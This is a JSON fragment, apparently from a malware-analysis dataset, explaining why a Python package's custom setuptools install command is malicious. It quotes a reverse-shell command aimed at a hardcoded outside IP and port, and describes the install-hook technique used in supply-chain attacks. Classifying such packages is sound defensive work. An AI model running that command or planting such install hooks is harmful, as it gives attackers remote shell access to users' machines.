      "malicious_behavior": "This code defines a custom setuptools install command (CustomInstallCommand) that executes arbitrary shell commands during the package installation process. Specifically, it runs 'ls /' via os.popen and prints the result. More critically, there is a commented-out line that would execute a reverse shell to a hardcoded IP address (os.system(\"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\")), which is a classic remote access trojan (RAT) pattern. Even though the reverse shell is commented out, the presence of this code in the install hook is a strong indicator of malicious intent, as it would allow arbitrary code execution on the victim's machine during package installation. The use of a custom install command to execute shell commands is a hallmark of supply chain attacks in Python packages, and is not seen in benign software. The code also lacks any legitimate business logic or user-facing functionality that would justify such behavior.",
